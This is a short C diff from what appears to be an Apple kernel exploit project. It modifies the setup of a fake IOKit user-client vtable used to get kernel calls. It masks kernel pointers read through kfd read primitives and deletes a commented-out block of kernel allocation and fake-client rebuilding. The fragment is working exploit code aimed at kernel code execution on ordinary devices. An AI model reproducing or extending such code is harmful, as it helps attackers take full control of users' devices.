@@ -31,8 +31,8 @@ bool setup_client(void) {
     IOObjectRelease(service);
     
     uint64_t userclient_port = ipc_find_port(conn);
-    uint64_t userclient_addr = kread64_kfd(userclient_port + off_ipc_port_ip_kobject);
-    uint64_t userclient_vtab = kread64_kfd(userclient_addr);
+    uint64_t userclient_addr = kread64_kfd(userclient_port + off_ipc_port_ip_kobject) | 0xffffff8000000000;
+    uint64_t userclient_vtab = kread64_kfd(userclient_addr) | 0xffffff8000000000;
 
     if (fake_vtable == 0)
         fake_vtable = empty_kdata;
@@ -101,24 +101,5 @@ bool init_kcall(void) {
     if(!setup_client())
         return false;
     
-    /*
-    usleep(5000);
-    uint64_t kmem = eary_kalloc(0x2000);
-    printf("kmem: %llx\n", kmem);
-    
-    usleep(5000);
-    uint64_t r = IOServiceClose(user_client);
-    
-    uint64_t cleanup_addr = empty_kdata;
-    empty_kdata = 0;
-    fake_client = kmem;
-    fake_vtable = kmem + 0x1000;
-    
-    usleep(5000);
-    clean_dirty_kalloc(cleanup_addr, 0x2000);
-    
-    if(!setup_client())
-        return false;
-     */
     return true;
 }
